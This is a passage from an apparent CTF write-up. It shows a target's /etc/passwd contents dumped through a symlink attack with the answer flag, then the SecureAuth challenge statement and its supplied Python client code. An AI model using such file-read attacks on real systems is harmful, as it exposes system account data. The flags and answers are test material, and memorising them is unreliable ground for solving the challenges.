&lt;span class="code-line"&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;dev&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="sr"&gt;/sh sync:x:4:65534:sync:/bin:/bin/s&lt;/span&gt;&lt;span class="n"&gt;ync&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;games&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;60&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;games&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="sr"&gt;/games:/bin/s&lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;man&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;man&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;var&lt;/span&gt;&lt;span class="sr"&gt;/cache/man:/bin/s&lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;lp&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;lp&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;var&lt;/span&gt;&lt;span class="sr"&gt;/spool/lpd:/bin/s&lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;mail&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;mail&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;var&lt;/span&gt;&lt;span class="sr"&gt;/mail:/bin/s&lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;news&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;news&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;var&lt;/span&gt;&lt;span class="sr"&gt;/spool/news:/bin/s&lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;uucp&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;uucp&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;var&lt;/span&gt;&lt;span class="sr"&gt;/spool/uucp:/bin/s&lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;proxy&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;13&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;13&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;proxy&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sh&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;33&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;33&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;var&lt;/span&gt;&lt;span class="sr"&gt;/www:/bin/s&lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;backup&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;34&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;34&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;backup&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;var&lt;/span&gt;&lt;span class="sr"&gt;/backups:/bin/s&lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;list&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;38&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;38&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;Mailing&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;List&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Manager&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;var&lt;/span&gt;&lt;span class="sr"&gt;/list:/bin/s&lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;irc&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;39&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;39&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;ircd&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;var&lt;/span&gt;&lt;span class="sr"&gt;/run/ircd:/bin/s&lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;gnats&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;41&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;41&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;Gnats&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Bug&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;Reporting&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;admin&lt;/span&gt;&lt;span class="o"&gt;):/&lt;/span&gt;&lt;span class="n"&gt;var&lt;/span&gt;&lt;span class="sr"&gt;/lib/gnats:/bin/s&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;nobody&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;65534&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;65534&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;nobody&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;nonexistent&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sh&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;libuuid&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;101&lt;/span&gt;&lt;span class="o"&gt;::/&lt;/span&gt;&lt;span class="n"&gt;var&lt;/span&gt;&lt;span class="sr"&gt;/lib/libuuid:/bin/s&lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;sshd&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;101&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;65534&lt;/span&gt;&lt;span class="o"&gt;::/&lt;/span&gt;&lt;span class="n"&gt;var&lt;/span&gt;&lt;span class="sr"&gt;/run/sshd:/usr/sbin/&lt;/span&gt;&lt;span class="n"&gt;nologin&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;facesec&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1000&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1000&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;W00tSymL1nkAttackStillW0rksIn2k15&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;home&lt;/span&gt;&lt;span class="sr"&gt;/facesec:/bin/s&lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The flag is the content of the &lt;code&gt;User ID Info&lt;/code&gt; of the facesec user.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Flag: W00tSymL1nkAttackStillW0rksIn2k15&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id="secureauth"&gt;SecureAuth&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;Thank to &lt;a href="https://twitter.com/_Spl3en"&gt;Spl3en&lt;/a&gt; who redacte this writeup before me.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Exploit | 350 points | http://quals.nuitduhack.com/challenges/view/16&lt;/p&gt;
&lt;h2 id="statement_2"&gt;Statement&lt;/h2&gt;
&lt;p&gt;*"There is a building. Inside this building there is a level where no elevator
can go, and no stair can reach. This level is filled with doors. These doors
lead to many places. Hidden places. But one door is special. One door leads to
the source." (The Keymaker)&lt;/p&gt;
&lt;p&gt;Find the key. Open the door.
Static client @ http://static.challs.nuitduhack.com/SecureAuthClient.tar.gz*&lt;/p&gt;
&lt;h2 id="challenge_2"&gt;Challenge&lt;/h2&gt;
&lt;p&gt;The tar.gz file contain the following python program:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;socket&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;hashlib&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;sha256&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;SecureConnect_Client&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sock&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;None&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;None&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;None&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sock&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AF_INET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SOCK_STREAM&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;151.80.18.93&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4241&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;login&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;challenge&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_challenge&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;authpacket&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;process_authpacket&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;challenge&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;[~] Sending auth packet...&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendall&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;authpacket&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_challenge&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;[:&lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;CHALLENGE&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;[~] Server sent challenge : &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt; !&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;raise&lt;/span&gt; &lt;span class="ne"&gt;Exception&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Bad challenge...&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;process_authpacket&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;authtoken&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;challenge&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;packet&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;AUTH &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;|&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sha256&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sha256&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;authtoken&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;challenge&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;[+] Auth data : &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;packet&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;packet&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_response&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;close&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;scc&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;SecureConnect_Client&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
